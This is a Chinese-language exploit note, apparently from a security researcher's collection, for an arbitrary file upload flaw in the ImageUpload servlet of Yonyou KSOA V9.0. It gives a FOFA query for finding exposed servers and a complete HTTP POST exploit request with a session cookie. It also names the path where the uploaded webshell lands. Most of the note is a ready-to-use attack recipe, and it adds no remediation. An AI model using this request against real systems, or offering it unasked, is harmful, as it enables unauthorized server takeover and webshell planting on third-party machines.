# 用友 KSOA V9.0任意文件上传漏洞

## 漏洞描述

用友时空KSOA是建立在SOA理念指导下研发的新一代产品,是根据流通企业前沿的IT需求推出的统一的IT基础架构,它可以让流通企业各个时期建立的IT系统之间彼此轻松对话。用友时空KSOA平台ImageUpload处存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。

## 漏洞影响

```
用友 KSOA V9.0
```

## FOFA

```
app="用友-时空KSOA"
```

## 漏洞复现

登录页面

![image-20230607223009983](../../../../Note/images/image-20230607223009983.png)

看下面EXP是有Cookie的，不知道是前台还是后台任意文件上传，注意一下。

EXP

```
POST /servlet/com.sksoft.bill.ImageUpload?filename={{文件名随便起}}&filepath=/ HTTP/1.1
Host:ip:port
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D7B9314CC6B287CBD4D4F700211212E3
Connection: close
Content-Length: 7

1234567
```



![image-20230607223120987](../../../../Note/images/image-20230607223120987.png)

Webshell地址：http:*//ip/pictures/{{文件名随便起}}*

![image-20230607223150663](../../../../Note/images/image-20230607223150663.png)